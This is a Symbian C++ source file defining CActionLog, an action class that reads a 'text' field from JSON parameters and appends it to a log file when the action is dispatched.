/*
 * ActionLog.cpp
 *
 *  Created on: 27/set/2010
 *      Author: Giovanna
 */

#include "ActionLog.h"
#include <HT\LogFile.h>

#include "Json.h"

CActionLog::CActionLog(TQueueType aQueueType) :
	CAbstractAction(EAction_Log, aQueueType)
	{
	// No implementation required
	}

CActionLog::~CActionLog()
	{
	delete iLogText;
	}

CActionLog* CActionLog::NewLC(const TDesC8& params, TQueueType aQueueType)
	{
	CActionLog* self = new (ELeave) CActionLog(aQueueType);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionLog* CActionLog::NewL(const TDesC8& params, TQueueType aQueueType)
	{
	CActionLog* self = CActionLog::NewLC(params, aQueueType);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionLog::ConstructL(const TDesC8& params)
	{
		BaseConstructL(params);
		
		//parse params
		RBuf paramsBuf;
			
		TInt err = paramsBuf.Create(2*params.Size());
		if(err == KErrNone)
			{
			paramsBuf.Copy(params);
			}
		else
			{
			//TODO: not enough memory
			}
		TBuf<128> text;	
		paramsBuf.CleanupClosePushL();
		CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
		CleanupStack::PushL(jsonBuilder);
		jsonBuilder->BuildFromJsonStringL(paramsBuf);
		CJsonObject* rootObject;
		jsonBuilder->GetDocumentObject(rootObject);
		if(rootObject)
			{
			CleanupStack::PushL(rootObject);
			//retrieve text
			rootObject->GetStringL(_L("text"),text);
			CleanupStack::PopAndDestroy(rootObject);
			}

		CleanupStack::PopAndDestroy(jsonBuilder);
		CleanupStack::PopAndDestroy(&paramsBuf);
		
		TUint8* ptr = (TUint8 *)text.Ptr();
		TInt lenText = text.Size();
		iLogText = HBufC8::NewL(lenText);
		if (lenText > 0)
			{
			TPtr8 ptrText((TUint8*)ptr,lenText,lenText);
			iLogText->Des().Append(ptrText); 	
			}
	}

void CActionLog::DispatchStartCommandL()
	{
		RFs	fs;
		TInt err = fs.Connect();
		if(err == KErrNone)
			{
			CLogFile* logFile = CLogFile::NewLC(fs);
			logFile->CreateLogL(LOGTYPE_INFO);
			logFile->AppendLogL(*iLogText);
			logFile->CloseLogL();
			CleanupStack::PopAndDestroy(logFile);
			fs.Close();
			}
		MarkCommandAsDispatchedL();
		SetFinishedJob(ETrue);
	}

